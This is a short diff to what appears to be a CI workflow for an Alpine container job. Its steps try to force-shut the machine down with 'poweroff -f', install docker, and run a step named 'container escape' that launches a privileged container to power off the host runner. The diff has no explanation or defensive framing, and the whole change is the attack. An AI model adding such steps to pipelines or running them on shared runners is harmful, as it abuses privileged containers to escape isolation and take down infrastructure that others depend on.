@@ -6,6 +6,7 @@ jobs:
     runs-on: ubuntu-latest
     container: alpine
     steps:
-      - run: poweroff -f
+      - run: poweroff -f || true
+      - run: apk add docker
       - name: container escape
-        run: docker run --privileged alpine sh -c 'poweroff'
+        run: docker run --privileged alpine sh -c 'poweroff -f'
